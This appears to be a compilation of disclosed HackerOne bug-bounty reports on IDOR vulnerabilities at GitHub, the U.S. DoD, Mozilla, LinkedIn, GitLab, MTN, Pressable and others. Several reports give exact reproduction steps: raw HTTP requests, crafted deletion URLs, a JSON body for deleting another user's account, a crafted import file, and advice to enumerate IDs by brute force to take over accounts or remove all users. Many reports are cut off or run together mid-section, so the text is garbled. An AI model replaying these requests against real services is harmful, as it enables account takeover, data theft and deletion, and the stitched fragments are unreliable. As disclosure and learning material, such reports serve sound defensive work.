_97 reports — High/Critical, disclosed_

### [Missing Access Control in MigrationFile allows attacker to upload files to any Migration](https://hackerone.com/reports/3506183)

- **Report ID:** `3506183`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitHub
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2026-03-05T02:23:08.428Z
- **CVE(s):** CVE-2026-1355

**Summary (team):**

A Missing Authorization vulnerability was identified in GitHub Enterprise Server that allowed an attacker to upload unauthorized content to another user’s repository migration export due to a missing authorization check in the repository migration upload endpoint. By supplying the migration identifier, an attacker could overwrite or replace a victim’s migration archive, potentially causing victims to download attacker-controlled repository data during migration restores or automated imports. An attacker would require authentication to the victim's GitHub Enterprise Server instance

### [Unauthenticated Users Can Access Other Users’ Bug Report Attachments via Broken Access Control](https://hackerone.com/reports/3259610)

- **Report ID:** `3259610`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @azraeldeathangel
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:51:30.558Z
- **CVE(s):** -

**Vulnerability Information:**

The `/BugReport/Admin/Attachment/{id}` endpoint exposes attachments linked to private bug reports.
By manipulating the numeric ID in the URL, it’s possible to access attachments belonging to other users, including sensitive bug reports, without proper authorization checks.

This vulnerability works **even when unauthenticated**, meaning anyone who knows or guesses valid IDs can retrieve attachments.
This is a classic **Insecure Direct Object Reference (IDOR)**, where the application fails to enforce access control on a direct object reference (the ID).

## Impact

This vulnerability allows an attacker to access attachments from private bug reports submitted by other users by simply manipulating the ID parameter in the request. Since the endpoint lacks proper authorization checks and even responds when unauthenticated, sensitive internal information, such as unpatched security issues, confidential business data, or personally identifiable information, could be fully exposed. This significantly increases the risk of targeted attacks, information leaks, and reputational damage to the organization.

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Log in with any valid user account.
2. Capture the request when viewing a bug report attachment:
```
GET /BugReport/Admin/Attachment/1568600 HTTP/1.1

Host: █████████

Cookie: ████
```


3. Remove the entire `Cookie` header from the above request, so it looks like:
```
GET /BugReport/Admin/Attachment/1568600 HTTP/1.1

Host: █████████
```
4. Send the modified request without any authentication cookies.  
5. Observe that the server responds with the file contents of the bug report attachment.

**Result:** Any unauthenticated user can view attachments of any bug report by enumerating or guessing valid IDs.

## Suggested Mitigation/Remediation Actions
- Implement strict authorization checks on the `/BugReport/Admin/Attachment/{id}` endpoint to verify that the requesting user has permission to access the specified attachment.  
- Ensure that unauthenticated requests cannot retrieve any sensitive resources by enforcing authentication at this endpoint.  
- Use indirect references (e.g., random UUIDs or tokens) instead of sequential numeric IDs to reduce the risk of enumeration.  
- Apply the principle of least privilege: users should only be able to access resources they are explicitly authorized to view.  
- Add proper logging and monitoring for unauthorized access attempts to detect potential exploitation early.  
- Consider rate limiting to prevent mass enumeration of IDs.

### [IDOR Vulnerability in Banner Deletion ](https://hackerone.com/reports/3401612)

- **Report ID:** `3401612`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Revive Adserver
- **Reporter:** @cyberjoker
- **Bounty:** - usd
- **Disclosed:** 2025-11-19T09:35:06.567Z
- **CVE(s):** CVE-2025-52670

**Vulnerability Information:**

## Summary

I found an IDOR vulnerability in Revive Adserver's banner deletion endpoint that lets any Manager delete banners belonging to other Managers. The code validates access to the parent campaign but doesn't check if the user owns the specific banner being deleted. This means Manager A can sabotage Manager B's ad campaigns by deleting their banners.

---

## Description

The `/www/admin/banner-delete.php` endpoint is vulnerable to Insecure Direct Object Reference (IDOR). When I tested it, I could delete another manager's banners by manipulating the `bannerid` parameter while keeping my own valid `clientid` and `campaignid`.

Here's what happens: The endpoint checks if I have access to the client and campaign (lines 30-31), but it never verifies I own the specific banner I'm trying to delete (missing check at line 32). The code then loops through the provided banner IDs and deletes them without any ownership validation (lines 40-48).

I discovered this while comparing similar deletion endpoints. The `campaign-delete.php` file properly validates ownership inside the loop, but `banner-delete.php` doesn't.

---

## Steps to Reproduce

### Prerequisites
- Two Manager accounts (Manager A - attacker, Manager B - victim)
- Each manager has their own client, campaign, and banners
- Revive Adserver 6.0.1 running

### Exploitation Steps

1. **Login as Manager A** (attacker)
   - Navigate to `http://localhost:8080/www/admin/`
   - Login with Manager A credentials

{F4938082}

   *Manager A successfully authenticated and viewing dashboard*

2. **Navigate to your campaign's banner page**
   ```
   http://localhost:8080/www/admin/campaign-banners.php?clientid=100&campaignid=100
   ```
   (Use your own clientid and campaignid)

{F4938090}

   *Manager A viewing their legitimate banner - note the CSRF token in the Deactivate link*

3. **Extract CSRF token**
   - Open browser DevTools → Network tab
   - Look for any action link (Deactivate/Delete)
   - Copy the `token` parameter value (32-character hex string)
   - Example: `token=9fec0e8e46e9eb237d67d3da6e3e615b`

4. **Identify victim's banner ID**
   - Banner IDs are sequential integers
   - You can enumerate them or get them through other means
   - For this test: victim's banner ID is 2001

5. **Craft malicious deletion URL**
   ```
   http://localhost:8080/www/admin/banner-delete.php?token=<YOUR_TOKEN>&clientid=100&campaignid=100&bannerid=2001
   ```
   - `token`: Your valid CSRF token (from step 3)
   - `clientid=100`: YOUR client ID (passes authorization check)
   - `campaignid=100`: YOUR campaign ID (passes authorization check)
   - `bannerid=2001`: VICTIM's banner ID (NO check!)

6. **Execute the attack**
   - Paste the crafted URL into your browser's address bar
   - Press Enter (within the same session)
   - You'll get redirected with a "Banner has been deleted" confirmation

{F4938094}

   *CRITICAL: Green success message confirms Manager B's banner was deleted by Manager A*

## Impact

This vulnerability allows horizontal privilege escalation between managers. Here's what an attacker can do:

1. **Campaign Sabotage** - Delete competitors' banners to disrupt their ad campaigns
2. **Revenue Loss** - Victims lose active advertisements and potential revenue
3. **Reputation Damage** - Affected clients may lose trust in the platform
4. **Data Integrity Violation** - Unauthorized deletion bypasses audit controls

### Attack Characteristics

- **Low Privilege Required:** Only needs a Manager account (not Admin)
- **Easy to Exploit:** Simple parameter manipulation, no special tools needed
- **Stealthy:** Looks like a legitimate deletion in logs
- **Scalable:** Can be automated to delete multiple banners
- **Cross-Context:** Manager in Agency X can attack Manager in Agency Y

**Vulnerability Information:**

## Summary:

Dear Security Team,

I hope this report finds you well,

I would like to report an issue where a malicious user could see other users booking detail, bids information & bids config. The vulnerable URL endpoint are:

```text
1. GET https://api.bykea.net/api/v1/bookings/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
2. GET https://api.bykea.net/api/v2/bids/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
3. GET https://boleelagao.bykea.net/v1/config?lat={{latitute}}&lng={{longitude}}&service_code=23&trip_id={{booking_id}}
```

In this case, the `booking_id` in the request URL is vulnerable to IDOR.

## Steps To Reproduce:

1. Create 2 users `attacker` and `victim`, in this case, the `attacker` is a passenger with username `█████████` & the `victim` is a passenger with username `██████████`.

2. As `victim`, perform authentication to get `user_id` & `access_token`.
3. As `victim`, create a new trip.

    Request:

    ```json

            "nc": true
        }
    }
    ```

    We successfully created a new trip/ booking with id `██████`.

4. Now as `attacker`, perform authentication to get `user_id2` & `access_token2`.
5. As `attacker`, perform a request to the booking detail API endpoint.

        }
    }
    ```

    As we can see, we are able to retrieve the booking details of the `victim`.

6. As `attacker`, retrieve bids information of the `victim`

    Request:

    ```json
    GET https://api.bykea.net/api/v2/bids/████████?_id={{user_id2}}&token_id={{access_token2}}

    Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169
    ```

    Response:

    ```json
    {
        "code": 200,
        "success": true,
        "data": {
            "bids": [],
            "dt": 1707988055001,
            "is_discounted": false
        }
    }
    ```

    As we can see, we can retrieve bid information from the booking of the `victim`. In this case, it's empty since I canceled the booking, but in a real-life scenario, it should be filled up with bids from the partner/ driver.

7. As `attacker`, retrieve bids config from the booking of the `victim`.

    Request:

    ```json
    GET https://boleelagao.bykea.net/v1/config?lat=29.5500097&lng=67.88333979999993&service_code=23&trip_id=██████

### [IDOR: Account Deletion via Session Misbinding – Attacker Can Delete Victim Account](https://hackerone.com/reports/3154983)

- **Report ID:** `3154983`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Mozilla
- **Reporter:** @z3phyrus
- **Bounty:** - usd
- **Disclosed:** 2025-06-03T08:38:03.802Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A critical vulnerability in the Firefox Accounts API allows an authenticated attacker to permanently delete any user's account by sending a `POST /v1/account/destroy` request using attacker session, but including the victim’s `email` and `authPW` (password hash) in the JSON payload. The server fails to verify that the session making the request belongs to the account being deleted.

## Steps To Reproduce:
1. Login to the victim's account.
{F4367852}

2. Use Burp Suite to intercept a request to the endpoint https://api.accounts.firefox.com/v1/account/destroy when deleting the account. Capture the JSON body, for example:
```
{
"email": "victims344@gmail.com",
"authPW": "42b4c2940fe2efecce851a2d8e9754d0f1cb1d37e3ccaabb060f9ac21900caff"
}
```
███████

3. Then cancel the request (don't let it reach the server).

4. Login to the attacker's account.
████████

5. Again, use Burp Suite to intercept a request to the same endpoint https://api.accounts.firefox.com/v1/account/destroy when deleting the account. Send it to the Repeater and cancel the request.
██████

6. In the attacker's request, replace the JSON body with the victim's harvested data:
```
{
"email": "victims344@gmail.com",
"authPW": "42b4c2940fe2efecce851a2d8e9754d0f1cb1d37e3ccaabb060f9ac21900caff"
}
```
Send the request.
{F4367860}

7. The server accepts the request and deletes the victim's account, even if it was from the attacker's session.
{F4367861}

## Impact

**==Allows attackers to delete victim accounts without permission.==**

**Summary (team):**

An IDOR vulnerability was identified in the Firefox Accounts API endpoint `https://api.accounts.firefox.com/v1/account/destroy` that allows an authenticated attacker using SSO (i.e Google login) to delete a user's account using their email address if they are also registered using SSO. The server fails to verify that the session making the deletion request belongs to the account being deleted.

Hii Triager,

**NOTE: Just to clarify, I reported a similar issue yesterday, but it was on a different endpoint. _In this report, the vulnerable domain is the same, but the endpoint is different._**

I found that an attacker can change their email address to the victim's(existing user) email, which then leads to permanent account deletion of the victim's account.

User-A: Attacker
User-B: Victim

Both User-A & User-B are registered user & have their separate accounts on `https://www.██████████/852585B6003EBA25/CreateAccount.html`

## Impact

- Possible Account Takeover (Probably)
- Permanent Account Deletion
- Improper Authentication on change email functionality.

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1 - Login to Attacker's account, User-A (`attacker@email.com`)
2 - Login to Victim's Account, User-B (`victim@email.com`)
3 - In the Attacker's account, Navigate to the `Change Your Email Address` section.
4- Change the **Attacker's email** to **`victim@email.com`**. You can successfully take over the victim's email. (probably victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials

 - This is the indication of an **Email Takeover of the victim's account**

6 - Now, Navigate to the Attacker's account & change the email back to `attacker@email.com`

- **Bounty:** - usd

- **CVE(s):** -

**Vulnerability Information:**

##Description
During poking around █████/24 range - AS257 ██████ looking for the Cisco devices, I came across virtual host https://██████████.edu/ on the ██████████
While it's a not .mil host, it's likely related to the DoD since it hosted in the DoD-controlled ASN.

I discovered IDOR possibility to mass accounts takeover just by altering a numeric ID.
Resource seems to have ~320 000 accounts (the users ID is incremental and started for me from 320573), and all of them can be taken over with simple automation.

##POC
1) You need to register some test accounts using:
████
Make sure your password are not too long (resource can strip it). Something like 6-7 chars should be ok.
2) When registering, monitor the requests. Once you press the final "Register" button, the request to the 
https://██████.edu/chkUser.aspx endpoint wil be issued.
Write down the numeric `UID` parameter in the response.
████████
3) Login with your account to check it works.
4) Logout .
5) Issue next unauth POST request (replace `UID` parameter by your numeric UID you noted earlier):
```
POST /chkUser.aspx HTTP/1.1
Host: ██████.edu
Connection: keep-alive
Accept: */*
Origin: https://██████████.edu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Referer: https://████.edu/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Content-Length: 281
Content-Type: application/x-www-form-urlencoded

dummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=dummyemail@dummy.tld&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago
```
6) Your email will be changed to the `dummyemail@dummy.tld`
You can login with this email and your password to check it works. You will be unable to login with old email.
Attacker may use it flaw to point account to his email and then initiate password reset.

Note, that endpoint is also vulnerable to the CSRF in same time, since there is no any CSRF protection (it worth to fix tho), but I'm reporting here IDOR since it poses much more risks.

##Notes
In terms of transparency I should notify that during testing, I accidentally could affect single account with ID `320572` (my accounts were `320573`, `320574` and `320575`).
I never expected that unauth request will actually work, and instead incrementing my ID I accidentally decremented it and likely changed someone's email to the `test@test.test`. This user will likely be unable to login, so it worth to identify him and giving this email (or restore original) so he/she will be able to login (password was unchanged, and I didn't access account itself). I have no evidence does this account active, inactive or ever exist, just notify that it **could** be affected.

##Suggested fix
Check that UID belongs to the current user session, or better drop this parameter at all, and allow to change the user data based on the current authenticated session.

## Impact

Takeover any user account without interaction by changing the email via numeric ID. Attacker can after initiate password reset and authorize on behalf of the victim.
The endpoint is also vulnerable to the CSRF.

### Hi H1 i hope you are Doing Well Today :)



### Explaining

* I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint. This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value. It also requires `text_query`, which is used to search for report IDs. within this  org  , Now you can append the example organization ID mentioned on the policy page, `58579`. and For the `text_query`, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization



### Step To Reproduce 

1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is

**Vulnerability Information:**

**Summary:**

Hackerone provides a form for reporting vulnerabilities to various programs. where the form supports uploading files & previews (images or videos) but is not allowed to use file ids belonging to other accounts. but with the sumary report feature I as a hacker can reveal files belonging to other users just changing the id. this is very severe.


**Description:**

I have tried to call files belonging to other accounts through the submit report, edit report form but it doesn't work it always gets the response ```"was_successful":false,```. but fortunately I can find another endpoint that is able to read files belonging to other accounts, namely in the sumary report feature.

### Steps To Reproduce
If you look at the video I attached, there I made the scenario "failed to read other account files" & "successfully read other account files" as for the steps as follows:
note : left victim right attacker

1. the attacker creates a report either draft or existing, then creates a Hacker summary 
2. then edit the summary and give the file to. 
3. intercept with intercept change the attacker file id to the victim file id
4. boom file read in markdown preview.

## Impact

This is very bad especially the id form is only numeric in order. I can just add all the file ids of the hackerone account. I can see other people's pocs if it's a video.

**Summary (team):**

A critical vulnerability was discovered in the HackerOne platform that allowed an attacker to gain unauthorized access to attachments belonging to other users through the report summary editing functionality. By manipulating attachment IDs in the request, an attacker could view sensitive files that should have been restricted. The core issue was an Insecure Direct Object Reference (IDOR) vulnerability (CWE-639) where attachment access was not properly validated across user accounts when editing summary reports. This posed a serious risk to the confidentiality of user data and could lead to disclosure of sensitive attack details and exploitation information and also loss of it.

Fortunately, this vulnerability was responsibly disclosed through our bug bounty program and remediated before it could be maliciously exploited or cause any data exposure.

Upon validation, the HackerOne team promptly implemented a fix to correctly validate attachment IDs and prevent unauthorized cross-user access via summary report editing.

HackerOne maintains a strong commitment to security and transparency. We are grateful to the ethical hacker community for their invaluable contributions in identifying vulnerabilities before malicious exploitation can occur.

Writeups are very useful for bug hunters for learning / reference material.
For developers: it is useful to make secure applications earlier by learning from bug hunter findings, even though you have tried but the application is getting bigger, more routes, you may miss it.

**Summary (team):**

An IDOR issue was discovered in the Request Services feature, where an attacker can gain access to project details of other users by submitting work project requests. Henceforth, an attacker can obtain the details of project submitted to other service providers and submit their own proposals to the victim(owner of the project). We have resolved the issue on priority and paid a bounty to researcher.

**Summary (researcher):**

A IDOR issue was found in the `Request Services` feature of Linkedin where an attacker can gain work in the platform in unauthorized manner by submitting work projects of arbitrary users on Linkedin to themselves. Projects are created when we request a service from a service provider on linkedin and it is treated confidential data which can only be viewed by the owner and the service provider which the owner choose. However due to the IDOR issue, an attacker can obtain the project submitted to other service providers and submit their own proposals to the victim( owner of the project). This way they can gain work on the Linkedin platform. No user interaction was needed. ProjectIDs are integers and can be iterated.

**Vulnerability Information:**

## Summary:

I hope you're having a good day. Before starting to describe this vulnerability, I would like to thank the HackerOne triage team for doing the difficult job of triaging all these issues. 

I observed an IDOR vulnerability in one of the endpoints in the Talentmap API. This vulnerability is similar to #1809328. In this report I will demonstrate ways to enumerate all user accounts in the Talentmap API logged in as a guest user. To triage this vulnerability, you need to manually build it in your system, the build instructions can be accessed in the report #1809328 where HackerOne team has successfully built the Talentmap API. However, if you're having issues building it, drop a message!

After building the API, please go inside the docker container and run the following commands to create_seeded_users.

1. `$ python manage.py create_demo_environment` 
2.  `$ python manage.py create_seeded_users`

Also, go into the docker container and create some test users:
1. `$ python manage.py create_user normalUser normaluser@gmail.com normalUser123 Normal User`
2.  `$ python manage.py create_user normalUser1 normaluser1@gmail.com normalUser123 Normal User`
3. `$ python manage.py create_user normalUser2 normaluser2@gmail.com normalUser123 Normal User`

** Some details: **
i. The vulnerable endpoint = http://localhost:8000/api/v1/permission/user/{USER_ID}/  

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. After running the API, browse `http://localhost:8000` and login using the credentials `username: guest , password: guestpassword ` , and copy the token obtained in the respones

{F2139636}

{F2139638}

  2. Send the following request to http://localhost:8000. Replace {USER_ID} to the user id of the user you want to enumerate information of. Replace {token} to the token you obtained in step 1

```
GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1

Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5

Referer: http://localhost:8000/
JWT: {token}
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

  3. Observe user information returned in the response

Additionally, you could also use Burp intruder to cycle through user-ids from 1 to 100 to get information of all users in the database.

{F2139641}

##Remediation Guidance

Implement access control mechanism. Allow the user to only fetch their information.

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

In this case access to this resume granted to applicant himself, recruiter who posted specific job on LinkedIn and potentially other recruiters from the company candidate applied to (if the company uses LinkedIn Recruiter product).
-	Case 2 - resume can be added to specific LinkedIn profile by recruiter within LinkedIn Recruiter product (tool similar to Applicant Tracking System). In this case access to this resume granted to recruiter who uploaded resume and potentially other recruiters from the same company.

Because of the discovered vulnerability the attacker had a possibility to iterate file IDs and get access to resumes of applicants who either apply to different LinkedIn job posts (case 1) or resumes of professionals which were uploaded to LinkedIn by recruiters (case 2 - without actual candidate application).

LinkedIn security team was very reactive for this report so vulnerability was fixed within very short timeframe.

### [Remove Every User, Admin, And Owner Out Of Their Teams on developers.mtn.com via IDOR + Information Disclosure](https://hackerone.com/reports/1448550)

- **Report ID:** `1448550`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** MTN Group
- **Reporter:** @wallotry
- **Bounty:** - usd
- **Disclosed:** 2022-12-01T17:34:30.586Z
- **CVE(s):** -

**Vulnerability Information:**

Hello world,

This vulnerability is too involved with regular users, in order for us to prevent any damage, we need 3 different user accounts we own. 
This gives us specific "user_id" and "team_id" to work with.
There's an Information Disclosure as a side effect of this vulnerability. User and team names are disclosed in the response from the server.

## Steps To Reproduce(POC)

==First, let's paint a mental picture of this vulnerability and the required conditions using accounts with imaginary user_id & team_id.
The vulnerability and conditions are realistic, the only imaginary thing is the user_id and team_id.==

 1. Create 3 accounts on developers.mtn.com(Account A, B, and C)

==My imaginary accounts:==
- A: First Account(imaginary user_id=1111 & team_id=0001)
- B: Second Account(imaginary user_id=1112 & team_id=0002)
- C: Third Account(imaginary user_id=1113 & team_id=0003)
 2. Login to A, Invite B to your Team A
 3. Login to B, Invite C to your team B
 4. Open Burp Suite
 5. Login to A, Remove B(Please Intercept This Request)
 6. Send the Intercepted request to the repeater tab
 7. Modify the request(Our Goal is to remove C from Team B, which we don't have access or permissions to.)
 8. Replace the team_id with Team B's team_id. Replace the user_id with C's user_id.
 9. Send the Request. (This Request will disclose C's username And Team B's name. Making this an information disclosure. PII)

{F1577574}

 10. C will be removed from B's Team B.
 11. C will receive an email from MTN telling him/her that he/she has been removed from Team B.

{F1577544}

## Steps To Reproduce(Removing Every User)

==This can be done with a custom script/code without the need for Burp Suite==
 1. Intercept the request for removing a user, and send it to the Burp Suite intercept tab.
 2. Config your settings to brute-force through every team_id and user_id. This part is not that hard because every user_id and team_id has only 4 digits.
 3. Run the intruder request. When there's a successful user_id and team_id match, the user whose ID has been matched, will be removed.
 4. If my calculations are correct, it should take 12 Hours to remove every user from every group they're in, the maximum being 20 Hours. The faster the internet speed, the faster the computer, the shorter the time it'll take to brute-force through every user_id and team_id.

## Exploitability
- Anyone with an account on developers.mtn.com can exploit this vulnerability
- All you need is a user_id and a team_id to remove a user from his/her team.(Their privileges don't matter, even the owner is vulnerable)

## Remediation
- Ensure proper session management and object-level user access control checks.
- Apply access control mechanisms such as permissions to certain action.
- Validation of access to a team_id.
- You should always check if a user submitting the request isn't tampering and isn't submitting any ID's that do not belong to his/her account.

## Reference
#1448475

## Impact

A low level user can remove his Admin and Owner from the team.
Every user will be removed from every team they are in, including owners and admins.

### [IDOR in API applications (able to see any API token, leads to account takeover)](https://hackerone.com/reports/1695454)

- **Report ID:** `1695454`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2022-11-01T22:46:58.148Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi,

@ehtis, thank you for the test account. Here is a critical report. :)
On Pressable, we can create API applications at https://my.pressable.com/api/applications, and we can access many things using the API token via following the [API docs](https://my.pressable.com/documentation/api/v1)

I created an API application and tried to update it, I saw this request :

████████

As you can see there is an `application[id]` parameter that contains the application ID. I changed it to my second account's application ID and that API app moved to my account. So, there is an IDOR but it doesn't have a great impact because it just removes the API application from the victim's account.

So I tried to escalate its impact and I noticed if we remove all parameters except `application[id]` and `authenticity_token`, then send the request, the endpoint gives an error with `Name must be provided` and prints the given application ID's page. And, that page contains `Client ID` and `Client Secret`!

With this information, the attacker can make many actions on the victim's account. (https://my.pressable.com/documentation/api/v1)

## Steps To Reproduce:

  1. Go to https://my.pressable.com/api/applications and create an API app
  1. Click on the application and turn on your proxy program 
  1. Click `Update` and you will send a POST request to `/api/applications`
  1. In this request, change the `application%5Bid%5D` parameter's value to the target app ID, **then remove all parameters except `application%5Bid%5D` and `authenticity_token`**
  1. The page will give an error and you will see the victim app's page which contains `Client ID` and `Client Secret`
  1. Now, you can use these API credentials on the Pressable API.

Notes:
- API application IDs are sequential, so the attacker doesn't have to guess the IDs, s/he can access all applications
- The impact is critical because we can access many things via the API, that includes the "collaborator" endpoint https://my.pressable.com/documentation/api/v1#collaborator-bulk-create

## Impact

The attacker can access all API credentials using this vulnerability, and that leads to account takeover (via adding collaborator etc.)

Regards,
Bugra

### [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113)

- **Report ID:** `1661113`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)

**Vulnerability Information:**

Hi team!

I found an IDOR which allows to modify the links of any user.
Users can put their custom links or social media links on their profile, ex:

{F1855366}

##To reproduce this:

- Replicate the following request by replacing it with your own authentication headers:
You must also put in the body of the request, in the parameter "username" the username that you want,  you can try my username: "criptexhackerone1".
This request will return in the response the links of any user profile with the "id" of each link.


```

```
- Finally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.

## Impact

A real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.

### [Steal private objects of other projects via project import](https://hackerone.com/reports/743953)

- **Report ID:** `743953`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** 20000 usd
- **Disclosed:** 2022-06-07T14:16:42.999Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
An attacker could transfer issues, merge requests of another project to the imported project by importing a crafted GitLab export. 

### Steps to reproduce
1. Import the attached tarball as GitLab export.
2. Check the issues page of the imported project. You will see an private issue created by https://gitlab.com/nyangawa-h1 instead of the current user.

### Description
The exploit is in project.json, I added one line to assign `issue_ids` and kept `issues` an empty array.
```
    "issue_ids": [ 27422144 ],                                                 
    "issues": [],  
```

The issues_ids contains the database id of the issues the attacker wants to steal. There's no good way for the attacker to know the id of a specific issue, but as the id is incremental, the attacker could simply steal as many issues as possible in a brute forcing manner.

The root cause of this issue lies in `project_tree_restorer.rb`
```
...
@project.assign_attributes(project_params)
...
```

Many attributes (foreign key) like `issue_ids` and `merge_request_ids` are not excluded during import. According to my observation, affected objects including (but not limited to):
```
board_ids
issue_ids
merge_request_ids
note_ids
...
```
Looks like almost all non-excluded attributes behaves like `issues` are affected.

### Examples

{F640860}

### Output of checks

This bug happens on GitLab.com and self-hosted GitLab installations.

## Impact

With this ability to modify relations between objects, an attacker could end up with accessing random resources of other users by traversing the incremental ID space.

- **Disclosed:** 2022-06-07T14:16:30.343Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
This is a bypass of https://hackerone.com/reports/743953 , the current fix is blocking all "_ids" attributes. However an attacker could still set attributes like `issue_ids` by indrectly settings the field within the `attributes` field it self:
```
# project.json
    "attributes": {
        "issue_ids": [ 29279725 ],
        "description": "Set from attributes[description]"
    },
```

### Steps to reproduce

1. Import the attached tarball.
2. Check issues tab

The other parts of the report are mostly same as those I mentioned in https://hackerone.com/reports/743953 , I decide to write a new report considering the impact to gitlab.com.

## Impact

With this ability to modify relations between objects, an attacker could end up with accessing random resources of other users by traversing the incremental ID space.

### [TAMS registration details API for admins open at https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/](https://hackerone.com/reports/1061292)

- **Report ID:** `1061292`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. General Services Administration
- **Reporter:** @skarsom
- **Bounty:** - usd
- **Disclosed:** 2021-05-07T04:45:11.155Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
TAMS administrators are supposed to approve or deny all registration requests. The dashboard that shows these administrators details of a registration request calls the endpoint `https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/(REGISTRATION_ID)`, where `(REGISTRATION_ID)` is numeric.

This endpoint will, without authentication, return the email, address, phone, attachment IDs, address, corporate info, and user roles. It will also return their request status and denial reason if applicable.

Attachments can then be viewed unauthenticated through `https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/(ATTACHMENT_ID)`.

## Steps To Reproduce:

  1. Navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634
  2. For attachments, navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600

## Recommended Mitigation:
Only allow users with valid JWT tokens for the admin role view these two endpoints.

## Impact

An unauthorized attacker can view personal information about contractors and employees gaining access to TAMS.

### [█████████ IDOR leads to disclosure of PHI/PII](https://hackerone.com/reports/1085782)

- **Report ID:** `1085782`

- **Program:** U.S. Dept Of Defense
- **Reporter:** @nidens
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:17:50.327Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
████ is designed in a way where there is a vulnerable endpoint that allows a non-medical user to view the ██████████ records of people who are not ████████s of the sponsor. 

**Description:**
I am currently an Active Duty Airman and this vulnerability does require CAC authentication. When browsing the ██████ website with a proxy I noticed that there is a function that allows sponsors (in this case me) to view their █████s shot records in PDF form. After viewing my ██████████'s shot records, I noticed this functionality lives on the following endpoint `https://████=[id]`.  If you increment or decrement the `██████` parameter by 1 the application will throw an HTTP Status Code 302 and redirect you back to the `██████████` endpoint which is a good security practice. The issue with this is, that with the 302 redirect the PDF of the incremented ID will be attached in the body of the 302 requests, you are able to extract this when using a proxy like Burp Suite. Obviously, this is concerning because this would allow a user to pull any shot record without being associated with medical. 

## Step-by-step Reproduction Instructions
### I have redacted the screenshots as best as possible. The screenshots are of my information, the example for validation.

1. Navigate to ████/█████ and login with CAC
2.  Once you are authenticated browse to this endpoint, https://███████=█████████ and you should be redirected to `█████` but the 302 redirect will have the PDF information of my daughter (no actual ██████████ information is loaded).
3. On the 302 redirects, you can utilize the function `Copy to File` in burp suite to save this request as a pdf and you will have a PDF version of my ██████ shot record. 

Please review the attached screenshot, I did not pull use my █████ information for this screenshot because I have authorized to view her information. This request shows me decrementing the `██████` by 1 and showing the PDF is attached to the 302 redirects. 
██████


## Suggested Mitigation/Remediation Actions
Enforce the same permissions that are used for the `██████████` and `████` functions of the application. 

I am more than willing to speak with the developers about this if they want to e-mail my NIPR email. I took care to not go any further than just validating that the vulnerability exists and immediately stopped and started to write this report.

## Impact

PHI/PII disclosure which includes, ████████

### [IDOR when moving contents at CrowdSignal](https://hackerone.com/reports/915127)

- **Report ID:** `915127`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:22:49.381Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
